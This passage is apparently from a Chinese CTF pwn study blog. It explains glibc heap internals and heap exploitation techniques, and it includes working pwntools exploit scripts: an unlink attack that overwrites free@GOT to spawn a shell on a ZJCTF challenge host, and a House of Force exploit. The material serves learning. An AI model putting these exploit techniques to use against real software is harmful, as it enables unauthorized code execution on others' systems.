class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">brk</span><span class="params">(<span class="type">void</span> *addr)</span>;<span class="comment">//*addr‰∏∫Êï∞ÊçÆÊÆµÁªìÊùüÂú∞ÂùÄ</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *<span class="title function_">sbrk</span><span class="params">(<span class="type">intptr_t</span> increment)</span>;<span class="comment">//ËøîÂõûÊìç‰ΩúÂâçÊï∞ÊçÆÊÆµÁªìÊùüÂú∞ÂùÄ</span></span><br></pre></td></tr></table></figure><p>ÂºÄÂêØASLRÂêéÔºåBSS segmentÂíåheapÈó¥Â≠òÂú®Random brk offsetÔºõÂÖ≥Èó≠ÂêéÔºåÂ†ÜÂºÄÂßãÂú∞ÂùÄÂíåÊï∞ÊçÆÊÆµÁªìÊùüÂú∞ÂùÄÈáçÂêà</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo bash -c &quot;echo 2 &gt; /proc/sys/kernel/randomize_va_space&quot;</span><br><span class="line">cat /proc/86231/maps</span><br></pre></td></tr></table></figure><h3 id="mmap"><a href="#mmap" class="headerlink" title="mmap"></a>mmap</h3><p>thread arena</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *<span class="title function_">mmap</span><span class="params">(<span class="type">void</span> *addr, <span class="type">size_t</span> len, <span class="type">int</span> prot, <span class="type">int</span> flags,</span></span><br><span class="line"><span class="params">    <span class="type">int</span> fildes, <span class="type">off_t</span> off)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">munmap</span><span class="params">(<span class="type">void</span> *addr, <span class="type">size_t</span> len)</span>;</span><br></pre></td></tr></table></figure><h3 id="malloc"><a href="#malloc" class="headerlink" title="malloc"></a>malloc</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *<span class="title function_">malloc</span><span class="params">(<span class="type">size_t</span> size)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">free</span><span class="params">(<span class="type">void</span> *ptr)</span>;</span><br><span class="line"><span class="type">void</span> *<span class="title function_">calloc</span><span class="params">(<span class="type">size_t</span> nmemb, <span class="type">size_t</span> size)</span>;</span><br><span class="line"><span class="type">void</span> *<span class="title function_">realloc</span><span class="params">(<span class="type">void</span> *ptr, <span class="type">size_t</span> size)</span>;</span><br></pre></td></tr></table></figure><p>Á¨¨‰∏ÄÊ¨°ÊâßË°åmalloc</p><ul><li>size&gt;&#x3D;128kB<ul><li>mmap &#x3D;&gt; sys_mmap</li></ul></li><li>size&lt;128kB<ul><li>brk &#x3D;&gt; sys_brk</li></ul></li></ul><h2 id="chunk"><a href="#chunk" class="headerlink" title="chunk"></a>chunk</h2><p>ÊúÄÂ∞èSIZE_T(ul)*4</p><p>chunk header(prev_size+size)+user data</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  This struct declaration is misleading (but accurate and necessary).</span></span><br><span class="line"><span class="comment">  It declares a &quot;view&quot; into memory allowing access to necessary</span></span><br><span class="line"><span class="comment">  fields at known offsets from a given base. See explanation below.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> &#123;</span></span><br><span class="line"></span><br><span class="line">  INTERNAL_SIZE_T      prev_size;  <span class="comment">/* Size of previous chunk (if free).  */</span></span><br><span class="line">  INTERNAL_SIZE_T      size;       <span class="comment">/* Size in bytes, including overhead. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd</span>;</span>         <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Only used for large blocks: pointer to next larger size.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd_nextsize</span>;</span> <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk_nextsize</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>allocated chunk&#x2F;freed chunk:</p><ul><li>prev_size: Áâ©ÁêÜ‰∏äËøûÁª≠ÔºåÂâç‰∏ç‰∏∫Á©∫ÂèØÂ§çÁî®</li><li>size:<ul><li>NON_MAIN_ARENA(<strong>A</strong>)</li><li>IS_MAPPED(<strong>M</strong>)</li><li>PREV_INUSE(<strong>P</strong>)</li></ul></li><li>fd,bk: linked list‰∏≠Ôºåallocated chunk‰∏≠Â§çÁî®</li><li>fd_nextsize,bk_nextsize: large chunk(‰∏çÂê´bin)</li></ul><p>top chunk: </p><ul><li>prev_size</li><li>size: Ââ©‰∏ãÂ§öÂ∞ëÁ©∫Èó¥</li></ul><p><img src="/../img/PWN%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%87%BA%E5%85%A5%E5%B9%B3%E5%AE%89%EF%BC%88%E4%B8%89%EF%BC%89%E2%80%94%E2%80%94heap.assets/image-20230601221411859.png" alt="image-20230601221411859"></p><p><img src="/../img/PWN%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%87%BA%E5%85%A5%E5%B9%B3%E5%AE%89%EF%BC%88%E4%B8%89%EF%BC%89%E2%80%94%E2%80%94heap.assets/image-20230601221609068.png" alt="image-20230601221609068"></p><p><img src="/../img/PWN%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%87%BA%E5%85%A5%E5%B9%B3%E5%AE%89%EF%BC%88%E4%B8%89%EF%BC%89%E2%80%94%E2%80%94heap.assets/image-20230601222129466.png" alt="image-20230601222129466"></p><p><img src="/../img/PWN%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%87%BA%E5%85%A5%E5%B9%B3%E5%AE%89%EF%BC%88%E4%B8%89%EF%BC%89%E2%80%94%E2%80%94heap.assets/image-20230619161203608.png" alt="image-20230619161203608"></p><p><img src="/../img/PWN%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%87%BA%E5%85%A5%E5%B9%B3%E5%AE%89%EF%BC%88%E4%B8%89%EF%BC%89%E2%80%94%E2%80%94heap.assets/image-20230619161741499.png" alt="image-20230619161741499"></p><h2 id="bin"><a href="#bin" class="headerlink" title="bin"></a>bin</h2><p>10 ‰∏™ fast binsÔºåÂ≠òÂÇ®Âú® fastbinsY ‰∏≠<br>1 ‰∏™ unsorted binÔºåÂ≠òÂÇ®Âú® bin[1]<br>62 ‰∏™ small binsÔºåÂ≠òÂÇ®Âú® bin[2] Ëá≥ bin[63]<br>63 ‰∏™ large binsÔºåÂ≠òÂÇ®Âú® bin[64] Ëá≥ bin[126]</p><h3 id="fast-bins"><a href="#fast-bins" class="headerlink" title="fast bins"></a>fast bins</h3><p>LIFOÂçïÈìæË°®(‰∏çÁî®bk)</p><p>chunk Â§ßÂ∞èÔºàÂê´ chunk Â§¥ÈÉ®ÔºâÔºö0x10-0x40Ôºà64 ‰Ωç 0x20-0x80Ôºâ</p><p>Áõ∏ÈÇª bin Â≠òÊîæÁöÑÂ§ßÂ∞èÁõ∏Â∑Æ 0x8Ôºà0x10ÔºâB„ÄÇ</p><p>‰∏çÂèñÊ∂àinuse flagÔºåÊïÖÁõ∏ÈÇª‰∏ç‰ºöÂêàÂπ∂</p><p>freeÁöÑÊó∂ÂÄôÊèíÂà∞ÂØπÂ∫îbinÈìæË°®ÁöÑÂâçÈù¢ÔºåÊ≥®ÊÑèËÆ∞ÂΩïÁöÑÂú∞ÂùÄ‰∏∫freeÁöÑÂú∞ÂùÄÂáè0x10</p><p>ÂêåÊ†∑ÁöÑÔºåmallocÂÆûÈôÖÂàÜÈÖçÁöÑÂÜÖÂ≠òÂ§ßÂ∞èÂ∫îÂä†‰∏ä0x10</p><p>ÂΩìÂàÜÈÖç‰∏ÄÂùóËæÉÂ∞èÁöÑÂÜÖÂ≠ò(mem&lt;&#x3D;64 Bytes)Êó∂Ôºå‰ºöÈ¶ñÂÖàÊ£ÄÊü•ÂØπÂ∫îÂ§ßÂ∞èÁöÑfastbin‰∏≠ÊòØÂê¶ÂåÖÂê´Êú™Ë¢´‰ΩøÁî®ÁöÑchunkÔºåÂ¶ÇÊûúÂ≠òÂú®ÂàôÁõ¥Êé•Â∞ÜÂÖ∂‰ªéfastbin‰∏≠ÁßªÈô§Âπ∂ËøîÂõûÔºõÂê¶ÂàôÈÄöËøáÂÖ∂‰ªñÊñπÂºèÔºàÂâ™Âàátop chunkÔºâÂæóÂà∞‰∏ÄÂùóÁ¨¶ÂêàÂ§ßÂ∞èË¶ÅÊ±ÇÁöÑchunkÂπ∂ËøîÂõû„ÄÇ</p><h3 id="unsorted-bin"><a href="#unsorted-bin" class="headerlink" title="unsorted bin"></a>unsorted bin</h3><p>FIFOÂèåÂêëÂæ™ÁéØÈìæË°®</p><p>Â§ß‰∫éfast binÊó∂ÔºåÊöÇÂ≠òÂú®unsorted bin</p><h3 id="small-bins"><a href="#small-bins" class="headerlink" title="small bins"></a>small bins</h3><p>FIFOÂèåÂêëÂæ™ÁéØÈìæË°®</p><p>0x10-0x1f8(0x20-0x3f0)</p><p>Áõ∏ÈÇªÁöÑÁ©∫Èó≤ chunk ‰ºöË¢´ÂêàÂπ∂</p><p>Áõ∏ÈÇª bin Â≠òÊîæÁöÑÂ§ßÂ∞èÁõ∏Â∑Æ 0x8Ôºà0x10ÔºâB</p><h3 id="large-bins"><a href="#large-bins" class="headerlink" title="large bins"></a>large bins</h3><p>Â§ß‰∫éÁ≠â‰∫é 0x200Ôºà0x400ÔºâBÔºàÂÆûÈôÖÂ§ßÂ∞èÔºâ</p><p>ÂèåÂêëÂæ™ÁéØÈìæË°®ÔºåÊèíÂÖ•ÂíåÂà†Èô§ÂèØ‰ª•ÂèëÁîüÂú®‰ªªÊÑè‰ΩçÁΩÆÔºåÁõ∏ÈÇªÁ©∫Èó≤ chunk ‰πü‰ºöË¢´ÂêàÂπ∂</p><p>fd_nextsize,bk_nextsize</p><p>Ââç32: 0x400 + 0x40*i</p><p>32~48: 0x1380 + 512*j</p><p>‚Ä¶</p><p>bin‰∏≠Â§ßÂ∞è‰∏çÂêåÔºåËøõË°åsort,Â§ßÂú®Ââç</p><h3 id="tcache-bins"><a href="#tcache-bins" class="headerlink" title="tcache bins"></a>tcache bins</h3><p>LIFO,max7,no prev_inuse</p><p>0x20-0x410(64in total,16byte)</p><p><code>tcache_perthread_struct</code>Êú¨Ë∫´‰πüÊòØ‰∏Ä‰∏™Â†ÜÂùóÔºåÂ§ßÂ∞è‰∏∫<code>0x250</code>Ôºå‰Ωç‰∫éÂ†ÜÂºÄÂ§¥ÁöÑ‰ΩçÁΩÆÔºåÂåÖÂê´Êï∞ÁªÑ<code>counts</code>Â≠òÊîæÊØè‰∏™<code>bin</code>‰∏≠ÁöÑ<code>chunk</code>ÂΩìÂâçÊï∞ÈáèÔºå‰ª•ÂèäÊï∞ÁªÑ<code>entries</code>Â≠òÊîæ<code>64</code>‰∏™<code>bin</code>ÁöÑÈ¶ñÂú∞ÂùÄÔºàÂèØ‰ª•ÈÄöËøá<strong>Âä´ÊåÅÊ≠§Â†ÜÂùó</strong>ËøõË°åÊîªÂáªÔºâ„ÄÇ</p><h3 id="last-remainder-chunk"><a href="#last-remainder-chunk" class="headerlink" title="last remainder chunk"></a>last remainder chunk</h3><p>mallocÊó∂ÔºåËæÉÂ§ßÁöÑchunk‰ºösplit‰∏ÄÈÉ®ÂàÜÂà∞last remainderÔºåunsorted bin‰πü‰ºöÂ≠ò</p><p>‰∏ãÊ¨°mallocÔºåÂ§üÂ§ß‰ºöÁõ¥Êé•ÂàáÂá∫Êù•</p><h2 id="main-arena-header"><a href="#main-arena-header" class="headerlink" title="main arena header"></a>main arena header</h2><p>Â≠òbin,top chunkÁ≠â</p><p>libc bss‰∏≠</p><h2 id="marge-freed-chunk"><a href="#marge-freed-chunk" class="headerlink" title="marge freed chunk"></a>marge freed chunk</h2><h3 id="process"><a href="#process" class="headerlink" title="process"></a>process</h3><ul><li><p>detect next inuse bit: freed?(to avoid double freed)</p></li><li><p>last freed? &#x3D;&gt; unlink &#x3D;&gt; merge &#x3D;&gt; merge into unsorted bin</p></li><li><p>next top?</p><ul><li>next freed?<ul><li>inuse: merge into unsorted bin</li></ul></li></ul></li></ul><h1 id="Use-After-Free"><a href="#Use-After-Free" class="headerlink" title="Use After Free"></a>Use After Free</h1><p>dangling pointer</p><h1 id="Heap-Overflow"><a href="#Heap-Overflow" class="headerlink" title="Heap Overflow"></a>Heap Overflow</h1><h2 id="Unlink"><a href="#Unlink" class="headerlink" title="Unlink"></a>Unlink</h2><h3 id="modern-protection"><a href="#modern-protection" class="headerlink" title="modern protection"></a>modern protection</h3><h4 id="corrupted-double-link-list"><a href="#corrupted-double-link-list" class="headerlink" title="corrupted double link list"></a>corrupted double link list</h4><p>when unlink</p><p>check if:</p><ul><li>P-&gt;bk-&gt;fd &#x3D;&#x3D; P</li><li>P-&gt;fd-&gt;bk &#x3D;&#x3D; P</li></ul><p>to satisfy:(i386)</p><ul><li><code>fakeFD -&gt; bk == P</code> &lt;&#x3D;&gt; <code>*(fakeFD + 12) == P</code></li><li><code>fakeBK -&gt; fd == P</code> &lt;&#x3D;&gt; <code>*(fakeBK + 8) == P</code></li></ul><p>then:</p><ul><li><code>fakeFD -&gt; bk = fakeBK</code> &lt;&#x3D;&gt; <code>*(fakeFD + 12) = fakeBK</code></li><li><code>fakeBK -&gt; fd = fakeFD</code> &lt;&#x3D;&gt; <code>*(fakeBK + 8) = fakeFD</code></li></ul><p><img src="/../img/PWN%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%87%BA%E5%85%A5%E5%B9%B3%E5%AE%89%EF%BC%88%E4%B8%89%EF%BC%89%E2%80%94%E2%80%94heap.assets/image-20230609205918850.png" alt="image-20230609205918850"></p><p>ËÆæÊåáÂêëÂèØ UAF chunk ÁöÑÊåáÈíàÁöÑÂú∞ÂùÄ‰∏∫ ptr</p><ol><li>‰øÆÊîπ fd ‰∏∫ ptr - 0x18</li><li>‰øÆÊîπ bk ‰∏∫ ptr - 0x10</li><li>Ëß¶Âèë unlink</li></ol><p>ÈúÄË¶Å‰ΩøfakechunkÁöÑÊåáÈíàÈ´ò‰∫éÂéüÊåáÈíà0x10‰∏™Â≠óËäÇÔºåÊâçËÉΩÈÄöËøáÊ£ÄÊµã</p><p>ptr-&gt;ptr-0x18</p><p><img src="/../img/PWN%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%87%BA%E5%85%A5%E5%B9%B3%E5%AE%89%EF%BC%88%E4%B8%89%EF%BC%89%E2%80%94%E2%80%94heap.assets/image-20230610225454294.png" alt="image-20230610225454294"></p><p><img src="/../img/PWN%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%87%BA%E5%85%A5%E5%B9%B3%E5%AE%89%EF%BC%88%E4%B8%89%EF%BC%89%E2%80%94%E2%80%94heap.assets/image-20230610231438688.png" alt="image-20230610231438688"></p><h3 id="ZJCTF-2019-Easyheap"><a href="#ZJCTF-2019-Easyheap" class="headerlink" title="ZJCTF 2019 Easyheap"></a>ZJCTF 2019 Easyheap</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">cmd=<span class="string">&#x27;&#x27;</span></span>):</span><br><span class="line">cmd += <span class="string">&quot;b main\n&quot;</span></span><br><span class="line">gdb.attach(p, cmd)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">host = <span class="string">&quot;node4.buuoj.cn&quot;</span></span><br><span class="line">port = <span class="number">26809</span></span><br><span class="line"><span class="comment">#p = process(&quot;./easyheap&quot;)</span></span><br><span class="line">p = remote(host, port)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">creat</span>(<span class="params">size, content</span>):</span><br><span class="line">p.sendlineafter(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;:&quot;</span>, <span class="built_in">str</span>(size).encode())</span><br><span class="line">p.sendlineafter(<span class="string">&quot;:&quot;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index, size, content</span>):</span><br><span class="line">p.sendlineafter(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;2&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;:&quot;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line">p.sendlineafter(<span class="string">&quot;:&quot;</span>, <span class="built_in">str</span>(size).encode())</span><br><span class="line">p.sendafter(<span class="string">&quot;:&quot;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delet</span>(<span class="params">index</span>):</span><br><span class="line">p.sendlineafter(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;3&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;:&quot;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line">creat(<span class="number">0x80</span>, <span class="string">&quot;aaaa&quot;</span>)</span><br><span class="line">creat(<span class="number">0x80</span>, <span class="string">&quot;bbbb&quot;</span>)</span><br><span class="line">creat(<span class="number">0x20</span>, <span class="string">&quot;/bin/sh&quot;</span>)</span><br><span class="line">addr = <span class="number">0x6020e0</span></span><br><span class="line">free_got = <span class="number">0x0000000000602018</span></span><br><span class="line">sys_plt = <span class="number">0x000000000400700</span></span><br><span class="line">payload = flat([<span class="number">0</span>, <span class="number">0x81</span>, addr-<span class="number">0x18</span>, addr-<span class="number">0x10</span>])</span><br><span class="line">payload = payload.ljust(<span class="number">0x80</span>, <span class="string">&quot;a&quot;</span>)</span><br><span class="line">payload += flat([<span class="number">0x80</span>, <span class="number">0x90</span>])</span><br><span class="line">edit(<span class="number">0</span>, <span class="number">0x90</span>, payload)</span><br><span class="line">delet(<span class="number">1</span>)</span><br><span class="line">payload = flat([free_got]).rjust(<span class="number">0x20</span>, <span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">edit(<span class="number">0</span>, <span class="number">0x20</span>, payload)</span><br><span class="line">edit(<span class="number">0</span>, <span class="number">0x8</span>, p64(sys_plt))</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">delet(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment">#Âä´ÊåÅatoiÔºåÂú®menu‰∏≠ËæìÂÖ•/bin/shÊïàÊûú‰∏ÄÊ†∑</span></span><br></pre></td></tr></table></figure><h4 id="fake-chunk"><a href="#fake-chunk" class="headerlink" title="fake chunk"></a>fake chunk</h4><h1 id="Using-malloc-maleficarum"><a href="#Using-malloc-maleficarum" class="headerlink" title="Using malloc maleficarum"></a>Using malloc maleficarum</h1><h3 id="The-House-of-Spirit"><a href="#The-House-of-Spirit" class="headerlink" title="The House of Spirit"></a>The House of Spirit</h3><p>Ë¶ÜÁõñ‰∏çÂà∞ret,ÂèØ‰ª•ÁõñÂà∞Ê†à‰∏äfreeÁöÑÊåáÈíà‰ΩçÁΩÆ</p><p><img src="/../img/PWN%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%87%BA%E5%85%A5%E5%B9%B3%E5%AE%89%EF%BC%88%E4%B8%89%EF%BC%89%E2%80%94%E2%80%94heap.assets/image-20230608162704523.png" alt="image-20230608162704523"></p><p>overflowÂêérop</p><h3 id="The-House-of-Force"><a href="#The-House-of-Force" class="headerlink" title="The House of Force"></a>The House of Force</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">cmd=<span class="string">&#x27;&#x27;</span></span>):</span><br><span class="line">cmd += <span class="string">&quot;b main\n&quot;</span></span><br><span class="line">gdb.attach(pt, cmd)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">host = <span class="string">&quot;&quot;</span></span><br><span class="line">port = <span class="number">0</span></span><br><span class="line">pt = process(<span class="string">&quot;./bamboobox&quot;</span>)</span><br><span class="line"><span class="comment">#pt = remote(host, port)</span></span><br><span class="line"></span><br><span class="line">pt.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="string">&quot;2&quot;</span>)</span><br><span class="line">pt.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="string">&quot;32&quot;</span>)</span><br><span class="line">pt.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="string">&quot;aaaa&quot;</span>)</span><br><span class="line"></span><br><span class="line">pt.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="string">&quot;3&quot;</span>)</span><br><span class="line">pt.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="string">&quot;0&quot;</span>)</span><br><span class="line">pt.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="string">&quot;80&quot;</span>)</span><br><span class="line">pt.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="string">b&quot;\x00&quot;</span>*<span class="number">0x28</span>+p64(<span class="number">0xffffffffffffffff</span>))</span><br><span class="line"></span><br><span class="line">pt.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="string">&quot;2&quot;</span>)</span><br><span class="line">debug()</span><br><span class="line">pt.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="string">&quot;-96&quot;</span>)</span><br><span class="line">pt.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="string">&quot;aaaa&quot;</span>)</span><br><span class="line"></span><br><span class="line">pt.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="string">&quot;2&quot;</span>)</span><br><span class="line">pt.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="string">&quot;16&quot;</span>)</span><br><span class="line">pt.sendlineafter(<span class="string">&quot;:&quot;</span>,p64(<span class="number">0x0000000000400d49</span>)*<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pt.interactive()</span><br></pre></td></tr></table></figure><h3 id="The-House-of-Orange"><a href="#The-House-of-Orange" class="headerlink" title="The House of Orange"></a>The House of Orange</h3><p>size&lt;&#x3D;128k(mmap)</p><p>È°µÂØπÈΩê4kb(0x1000)</p><h3 id="house-of-botcake"><a href="#house-of-botcake" class="headerlink" title="house of botcake"></a>house of botcake</h3><p>ÈíàÂØπÊ£ÄÊµãkey</p><ul><li>tcacheÂ°´Êª°</li><li>AËøõÂÖ•unsorted binÔºåbÈöèÂêéÔºåÂ§ßÂ∞è‰∏∫tcache,ÂêàÂπ∂</li><li>ÈáäÊîæ‰∏Ä‰∏™tcache</li><li>free B</li></ul><h3 id="Overwrite-Fastbin"><a href="#Overwrite-Fastbin" class="headerlink" title="Overwrite Fastbin"></a>Overwrite Fastbin</h3><table><thead><tr><th>ÊîªÂáªÊñπÊ≥ï</th><th>ÂΩ±ÂìçËåÉÂõ¥</th><th>Â≠¶‰π†ÈìæÊé•</th></tr></thead><tbody><tr><td>house of spirit</td><td>2.23‚Äî‚Äî Ëá≥‰ªä</td><td>Â†ÜÂà©Áî®Á≥ªÂàó‰πã house of spirit - ÂÆâÂÖ®ÂÆ¢ - ÂÆâÂÖ®ËµÑËÆØÂπ≥Âè∞ (anquanke.com)</td></tr><tr><td>house of einherjar</td><td>2.23‚Äî‚Äî Ëá≥‰ªä</td><td>PWN‚Äî‚ÄîHouse Of Einherjar CTF Wiki ‰æãÈ¢òËØ¶Ëß£ - ÂÆâÂÖ®ÂÆ¢ - ÂÆâÂÖ®ËµÑËÆØÂπ≥Âè∞ (anquanke.com)</td></tr><tr><td>house of force</td><td>2.23‚Äî‚Äî2.29</td><td>Top chunk Âä´ÊåÅÔºöHouse of force ÊîªÂáª - ÂÆâÂÖ®ÂÆ¢ - ÂÆâÂÖ®ËµÑËÆØÂπ≥Âè∞ (anquanke.com)</td></tr><tr><td>house of lore</td><td>2.23‚Äî‚Äî Ëá≥‰ªä</td><td>House of Lore - CTF Wiki (ctf-wiki.org)</td></tr><tr><td>house of orange</td><td>2.23‚Äî‚Äî2.26</td><td>House of orange - ÂÆâÂÖ®ÂÆ¢ - ÂÆâÂÖ®ËµÑËÆØÂπ≥Âè∞ (anquanke.com)</td></tr><tr><td>house of rabbit</td><td>2.23‚Äî‚Äî2.28</td><td><a href="http://p4nda.top/2018/04/18/house-of-rabbit/">http://p4nda.top/2018/04/18/house-of-rabbit/</a></td></tr><tr><td>house of roman</td><td>2.23‚Äî‚Äî2.29</td><td>House of Roman - CTF Wiki (ctf-wiki.org)</td></tr><tr><td>house of storm</td><td>2.23‚Äî‚Äî2.29</td><td>House of storm ÂéüÁêÜÂèäÂà©Áî® - ÂÆâÂÖ®ÂÆ¢ - ÂÆâÂÖ®ËµÑËÆØÂπ≥Âè∞ (anquanke.com)</td></tr><tr><td>house of corrosion</td><td>2.23‚Äî‚Äî Ëá≥‰ªä</td><td>House-of-Corrosion ‰∏ÄÁßçÊñ∞ÁöÑÂ†ÜÂà©Áî®ÊäÄÂ∑ß - ÂÖàÁü•Á§æÂå∫ (aliyun.com)</td></tr><tr><td>house of husk</td><td>2.23‚Äî‚Äî Ëá≥‰ªä</td><td>house-of-husk Â≠¶‰π†Á¨îËÆ∞ - ÂÆâÂÖ®ÂÆ¢ - ÂÆâÂÖ®ËµÑËÆØÂπ≥Âè∞ (anquanke.com)</td></tr><tr><td>house of atum</td><td>2.26‚Äî‚Äî2.30</td><td><a href="https://abf1ag.github.io/2021/06/11/house-of-atum/">https://abf1ag.github.io/2021/06/11/house-of-atum/</a></td></tr><tr><td>house of kauri</td><td>2.26‚Äî‚Äî2.32</td><td>Overview of GLIBC heap exploitation techniques (0x434b.dev)</td></tr><tr><td>house of fun</td><td>2.23‚Äî‚Äî2.30</td><td>Overview of GLIBC heap exploitation techniques 